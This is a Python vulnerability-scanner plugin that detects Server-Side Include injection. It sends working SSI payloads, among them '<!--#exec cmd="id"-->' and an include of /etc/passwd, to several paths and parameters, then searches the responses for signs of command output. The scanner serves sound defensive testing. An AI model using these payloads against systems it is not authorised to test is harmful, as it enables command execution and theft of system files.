"""
Plugin 1229: Server-Side Include (SSI) Injection Detection
=============================================================
Detects Server-Side Include (SSI) injection vulnerabilities by injecting
<!--#exec cmd="id"--> and <!--#printenv--> directives.
"""
import asyncio
import ssl
import urllib.parse

from plugins import NaslPlugin, PluginResult


class SsiInjectionDetection(NaslPlugin):
    PLUGIN_ID = 1229
    NAME = 'Server-Side Include (SSI) Injection Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 8.6
    DESCRIPTION = (
        'Detects Server-Side Include (SSI) injection vulnerabilities by injecting '
        '<!--#exec cmd="id"--> and <!--#printenv--> directives. SSI injection allows '
        'command execution, file disclosure, and environment variable enumeration '
        'on servers with SSI enabled.'
    )
    SOLUTION = (
        'Disable SSI on the web server if not needed. Use allowlists for allowed '
        'SSI directives. Apply input validation to prevent SSI directive injection.'
    )
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    SSI_PAYLOADS = [
        '<!--#echo var="DOCUMENT_NAME"-->',
        '<!--#exec cmd="id"-->',
        '<!--#printenv-->',
        '<!--#include virtual="/etc/passwd"-->',
    ]

    PARAMS = [
        'name', 'file', 'page', 'include', 'template', 'view',
        'input', 'content',
    ]

    PATHS = ['/', '/api', '/search', '/page']

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for path in self.PATHS:
                    for param in self.PARAMS[:4]:
                        for payload in self.SSI_PAYLOADS:
                            try:
                                reader, writer = await asyncio.wait_for(
                                    asyncio.open_connection(target, port_to_check, ssl=ctx),
                                    timeout=5
                                )
                                encoded = urllib.parse.quote(payload)
                                req = (
                                    f'GET {path}?{param}={encoded} HTTP/1.1\r\n'
                                    f'Host: {host_header}\r\n'
                                    f'User-Agent: Centra/1.0\r\n'
                                    f'Connection: close\r\n\r\n'
                                )
                                writer.write(req.encode())
                                await writer.drain()

                                response = b''
                                try:
                                    while True:
                                        chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                        if not chunk:
                                            break
                                        response += chunk
                                        if len(response) > 16384:
                                            break
                                except asyncio.TimeoutError:
                                    pass
                                writer.close()
                                await writer.wait_closed()

                                body = response.split(b'\r\n\r\n', 1)
                                body_text = body[1].decode('utf-8', errors='ignore') if len(body) > 1 else ''

                                ssi_indicators = ['DOCUMENT_NAME', 'uid=', 'gid=', 'root:', 'SERVER_SOFTWARE',
                                                  'LAST_MODIFIED', 'DATE_LOCAL', '<!--#']
                                if any(ind in body_text for ind in ssi_indicators):
                                    results.append(PluginResult(
                                        vulnerable=True,
                                        target=target,
                                        port=port_to_check,
                                        cvss_score=self.CVSS_SCORE,
                                        severity='high',
                                        description=f'SSI injection detected via param "{param}" on {path}',
                                        solution=self.SOLUTION,
                                        evidence=f'Payload: {payload}, SSI output detected in response',
                                        references=[
                                            'https://owasp.org/www-community/attacks/Server-Side_Includes_Injection',
                                        ]
                                    ))
                                    break
                            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                                pass
                        if results:
                            break
                    if results:
                        break

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No SSI injection indicators detected on checked ports'
            ))

        return results
